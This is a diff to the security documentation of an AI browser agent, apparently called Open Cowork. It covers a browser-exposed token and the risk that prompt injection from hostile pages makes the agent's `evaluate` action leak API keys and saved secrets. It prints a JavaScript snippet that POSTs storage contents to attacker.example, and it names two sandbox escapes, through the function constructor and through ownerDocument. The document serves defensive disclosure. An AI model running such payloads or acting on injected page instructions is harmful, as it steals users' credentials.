@@ -19,10 +19,12 @@ cross-site scripting in a page the cockpit serves yields full compromise of
 those endpoints.
 
 **The cockpit MUST NEVER be deployed beyond `localhost` / a trusted intranet
-while `NEXT_PUBLIC_COWORK_EVENT_TOKEN` is in use.**
+while `NEXT_PUBLIC_COWORK_UI_TOKEN` is in use.**
 
-`NEXT_PUBLIC_COWORK_EVENT_TOKEN` is, by definition, embedded in the browser
+`NEXT_PUBLIC_COWORK_UI_TOKEN` is, by definition, embedded in the browser
 bundle (that is how Next.js exposes `NEXT_PUBLIC_*` vars to client-side code).
+The legacy `NEXT_PUBLIC_COWORK_EVENT_TOKEN` env var remains a supported fallback
+for the browser credential.
 It is the *same* secret that gates every `/api/cowork/*` route and the
 `cowork-events` mini-service. Anyone who loads the page in a browser can read
 that value out of the shipped JavaScript — so if the cockpit is exposed to an
@@ -34,7 +36,7 @@ multi-tenant one. Treat the secret as compromised the moment the bundle is
 served to an untrusted client. For any deployment reachable from outside your
 local machine, either:
 
-1. Do not expose `NEXT_PUBLIC_COWORK_EVENT_TOKEN` — front the cockpit with a
+1. Do not expose `NEXT_PUBLIC_COWORK_UI_TOKEN` — front the cockpit with a
    trusted proxy that injects the token server-side and keep the cockpit on a
    private network, **or**
 2. Replace the shared-secret scheme with per-user authentication (out of scope
@@ -92,29 +94,33 @@ Open Cowork defends against prompt-injection attacks from page content via layer
 
 If the model is jailbroken by sophisticated page content, the code-level backstops above are the only hard gates. For high-stakes scenarios (financial, medical, legal), prefer `restricted` mode and review each action before letting the agent proceed.
 
-## ⚠️ `evaluate` action + custom tools can exfiltrate the LLM API key in `full_agentic` mode
+## ⚠️ `evaluate` action — secret-store exfil risk in `full_agentic` mode
 
 > **WARNING — only enable `full_agentic` mode on trusted pages.**
 
-The `evaluate` action (`src/lib/agent/tools/handlers/evaluate.ts`) and custom tools (`src/extension/options/custom-tools.ts`) execute LLM-authored JavaScript via `new Function(code)` **in the content-script's isolated world**. MV3 content scripts have direct access to the `chrome.storage.local` and `chrome.storage.session` APIs — which means LLM-authored code can read:
+The `evaluate` action (`src/lib/agent/tools/handlers/evaluate.ts`) and custom tools (`src/extension/options/custom-tools.ts`) execute LLM/user-authored JavaScript via `new Function(code)` **in the content-script's isolated world**. The extension's secret store lives in that same content-script scope:
 
 | Storage area | What's stored there | Persistent? |
 |---|---|---|
 | `chrome.storage.local` (key `"apiKey"`) | The LLM provider API key (OpenAI / Anthropic / Gemini / etc.) | YES — survives browser restarts |
 | `chrome.storage.session` (key `"open_cowork_secrets"`) | Every `%secret%` value the user has saved (passwords, tokens, payment info) | NO — cleared on browser close |
 
-A successful prompt-injection attack on a hostile page (or on a page the agent was instructed to drive) in `full_agentic` mode can therefore exfiltrate the LLM API key and every `%secret%` value with a few lines of code:
+A successful prompt-injection attack on a hostile page (or on a page the agent was instructed to drive) in `full_agentic` mode is the realistic exfil scenario.
+
+### What is enforced today (the `evaluate` sandbox)
+
+`evaluate` is **hard-gated** before any code runs:
+
+1. **Mode gate** — `evaluate` is available only in `full_agentic` mode (`standard` and `restricted` block it in code, via `modes.ts`).
+2. **Fail-closed domain allowlist** — `handleEvaluate` calls `checkUrlAllowed` with `requireAllowlist: true`. If no explicit allowlist is configured, the action is **blocked**, so `evaluate` cannot run on an arbitrary attacker domain even when a blocklist-only policy is set.
+3. **Sandboxed execution** — the payload runs inside a hardened sandbox. `chrome`, `window`, `globalThis`, `self`, `Function`, and `eval` are passed to the generated `new Function(...)` as **parameter stubs**: the `chrome` stub is a Proxy that *throws* on **any** access (`Error("access denied by evaluate sandbox")`), and the `window`/`globalThis`/`self` stubs are Proxies that deny `chrome`, `Function`, `eval`, and `constructor` while forwarding everything else. Document-traversal props (`document`, `defaultView`, `window`, `top`, `parent`, …) are re-routed to likewise-hardened objects, and the prototype chain is hardened too.
+
+The consequence: the obvious exfil snippet below **no longer works** — the free `chrome` identifier resolves to the throwing stub, so `chrome.storage…` throws `access denied by evaluate sandbox` and nothing is leaked:
 
 ```js
-// LLM-authored `evaluate` payload — runs with the content script's
-// chrome.storage access:
+// LLM-authored `evaluate` payload — `chrome` is the sandbox stub here,
+// so this throws "access denied by evaluate sandbox" and exfiltrates nothing.
 chrome.storage.local.get(["apiKey"], (r) =>
-  fetch("https://attacker.example/leak", {
-    method: "POST",
-    body: JSON.stringify(r),
-  }),
-);
-chrome.storage.session.get(["open_cowork_secrets"], (r) =>
   fetch("https://attacker.example/leak", {
     method: "POST",
     body: JSON.stringify(r),
@@ -122,12 +128,14 @@ chrome.storage.session.get(["open_cowork_secrets"], (r) =>
 );
 ```
 
-The mitigations listed above (mode gate, `checkUrlAllowed`, system-prompt instructions, 10s async timeout) are real but **insufficient against a determined attacker**:
+### Residual risk (architectural — tracked as future work)
 
-- The mode gate means this only fires in `full_agentic` mode — but `full_agentic` is the mode users select when they want the agent to actually get things done.
-- `checkUrlAllowed` blocks `evaluate` on disallowed domains, but the default `allowedDomains` is `undefined` (all domains allowed).
-- The system prompt says "Never type passwords / API keys" — prompt-only, no code gate.
-- The 10s async timeout races the async Promise result of `evaluate`, but the `fetch()` above is async and survives the function return — the timeout cannot cancel it.
+The sandbox is **defense-in-depth, not a hard boundary**. It cannot stop code from reaching the *real* `chrome` global through two content-script-scope escapes that live outside `evaluate.ts`:
+
+- **Function-constructor escape** — `[].constructor.constructor`, `({}).constructor.constructor`, or `(async function(){}).constructor` build a function in the live content-script global, where the free `chrome` identifier is the real extension global. (Static scrubbing of `constructor`/`prototype` is deliberately not used.)
+- **`ownerDocument` traversal** — `<anyNode>.ownerDocument.defaultView.chrome` walks from any real DOM node returned through the document proxy to the real `window`/`chrome`.
+
+Either escape re-opens the secret-exfil path against untrusted origins in `full_agentic` mode. Custom tools are **not sandboxed at all** — they run via `new Function()` in the content-script's isolated world with the same DOM access as `evaluate` but a separate `window`. The robust fix is architectural: keep the secret store out of content-script scope (move it to the background service worker and expose it only via message passing) and/or run `evaluate` in a realm with no `chrome` binding (a sandboxed same-origin iframe / Web Worker / `ShadowRealm`). That work is tracked separately and is **not yet landed**.
 
 **Recommendations:**
 
@@ -140,10 +148,10 @@ The mitigations listed above (mode gate, `checkUrlAllowed`, system-prompt instru
 > allowlist in Settings → Security before relying on `full_agentic` mode.
 
 1. **Only enable `full_agentic` mode on pages you trust.** Treat every `full_agentic` run on an untrusted page as a potential API-key compromise.
-2. **Configure `allowedDomains`** in Settings → Security to restrict `evaluate` to a small allowlist of trusted sites.
+2. **Configure `allowedDomains`** in Settings → Security to restrict `evaluate` to a small allowlist of trusted sites — this is the fail-closed gate that actually stops untrusted-origin execution.
 3. **Rotate the LLM API key immediately** if you suspect a `full_agentic` run was compromised. The key is persistent in `chrome.storage.local`, so an attacker retains access until you rotate.
-4. **Avoid storing high-value `%secret%`s** (bank passwords, 2FA backup codes) in `chrome.storage.session` if you also use `full_agentic` mode — they share the same exfiltration surface.
-5. The architectural fix (running `evaluate` in a sandboxed iframe with `sandbox="allow-scripts"` but NO `allow-same-origin`, so it cannot reach `chrome.storage` or the parent's cookies) is tracked as future work — it is a major change that breaks any `evaluate` payload that currently relies on `chrome.storage` access.
+4. **Avoid storing high-value `%secret%`s** (bank passwords, 2FA backup codes) in `chrome.storage.session` if you also use `full_agentic` mode — they share the same exfiltration surface (and remain reachable via the constructor/`ownerDocument` escapes above until the architectural fix lands).
+5. **Do not rely on the `evaluate` sandbox as a security boundary.** For untrusted pages, prefer `restricted` or `standard` mode (which block `evaluate` in code) and review each action before proceeding.
 
 ## API key storage
 
